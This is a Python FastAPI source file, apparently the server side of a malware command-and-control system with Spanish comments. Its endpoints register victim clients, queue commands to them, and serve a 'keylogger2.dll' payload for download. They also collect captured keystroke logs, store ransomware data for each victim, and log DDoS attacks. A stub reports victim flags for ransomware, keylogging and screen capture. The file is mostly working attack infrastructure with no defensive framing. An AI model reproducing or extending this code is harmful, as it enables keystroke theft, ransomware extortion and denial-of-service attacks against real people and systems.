from fastapi import FastAPI, Depends, HTTPException, Response, status
from sqlalchemy.orm import Session
import database, schemas, repository, models
from typing import List
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import datetime
app = FastAPI()

app.mount("/static", StaticFiles(directory="static"), name="static")

def get_db():
    db = database.SessionLocal()
    try:
        yield db
    finally:
        db.close()

models.Base.metadata.create_all(bind=database.engine) 

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Permite todas las origenes
    allow_credentials=True,
    allow_methods=["*"],  # Permite todos los métodos
    allow_headers=["*"],  # Permite todos los headers
)

@app.get("/prueba/")
def prueba(db: Session = Depends(get_db)):
    return "Hola que tal"

@app.post("/admins/", response_model=schemas.Admin)
def create_admin(admin: schemas.AdminCreate, db: Session = Depends(get_db)):
    db_admin = repository.create_admin(db, admin)
    return db_admin


@app.get("/admins/", response_model=list[schemas.Admin])
def read_admins(db: Session = Depends(get_db)):
    admins = repository.get_admins(db)
    return admins


@app.post("/clients/", response_model=schemas.Client)
def create_client(client: schemas.ClientCreate, db: Session = Depends(get_db)):
    return repository.create_client(db, client)


@app.get("/clients/", response_model=List[schemas.Client])
def read_clients(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    return repository.get_clients(db, skip=skip, limit=limit)


@app.post("/commands/", response_model=schemas.Command)
def create_command(command: schemas.CommandCreate, db: Session = Depends(get_db)):
    return repository.create_command(db, command)


@app.get("/commands/", response_model=List[schemas.Command])
def read_commands(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    return repository.get_commands(db, skip=skip, limit=limit)


@app.get("/clients/{client_id}/commands/", response_model=List[schemas.Command])
def read_commands_for_client(client_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    return repository.get_commands_by_client_id(db, client_id, skip=skip, limit=limit)

@app.get("/get-text-file/")
async def get_text_file():
    file_path = "static/keylogger2.dll"
    return FileResponse(
        path=file_path, 
        media_type='application/octet-stream', 
        headers={"Content-Disposition": f"attachment; filename={file_path.split('/')[-1]}"}
    )

@app.put("/keystroke-logs/", response_model=schemas.KeystrokeLog)
def upsert_keystroke_log(keystroke_log: schemas.KeystrokeLogCreate, db: Session = Depends(get_db)):
    return repository.upsert_keystroke_log(db, keystroke_log)


@app.get("/keystroke-logs/", response_model=List[schemas.KeystrokeLog])
def read_keystroke_logs(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    keystroke_logs = repository.get_keystroke_logs(db, skip=skip, limit=limit)
    return keystroke_logs


@app.get("/client-info/")
def get_client_info():
    return {
        "client_id": "1",
        "ip_address": "192.168.1.23",
        "operating_system": "Windows",
        "ransomware": True,
        "keylogger": True,
        "screencapture": True,
        "cifrado": False,
        "polling": 10,
        "id": 1,
        "last_seen": datetime.datetime.now().isoformat(),  # Genera una fecha y hora actual
        "is_active": True
    }

@app.delete("/commands/{command_id}", status_code=204)
def delete_command(command_id: int, db: Session = Depends(get_db)):
    db_command = repository.delete_command(db, command_id)
    if db_command is None:
        raise HTTPException(status_code=404, detail="Comando no encontrado")
    return Response(status_code=status.HTTP_204_NO_CONTENT)

@app.post("/ransomware-data/", response_model=schemas.RansomwareData)
def create_ransomware_info(ransomware_data: schemas.RansomwareDataCreate, db: Session = Depends(get_db)):
    return repository.create_ransomware_data(db, ransomware_data)

@app.get("/ransomware-data/{client_id}", response_model=schemas.RansomwareData)
def get_ransomware_info(client_id: int, db: Session = Depends(get_db)):
    ransomware_info = repository.get_ransomware_data(db, client_id)
    if ransomware_info is None:
        raise HTTPException(status_code=404, detail="Información de Ransomware no encontrada para el cliente especificado")
    return ransomware_info

@app.get("/ransomware-data/", response_model=List[schemas.RansomwareData])
def read_all_ransomware_data(db: Session = Depends(get_db)):
    return repository.get_all_ransomware_data(db)

@app.post("/ddos-attacks/", response_model=schemas.DDoSAttack)
def create_ddos_attack(attack: schemas.DDoSAttackCreate, db: Session = Depends(get_db)):
    return repository.create_ddos_attack(db, attack)

@app.get("/ddos-attacks/", response_model=List[schemas.DDoSAttack])
def read_ddos_attacks(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    attacks = repository.get_ddos_attacks(db, skip=skip, limit=limit)
    return attacks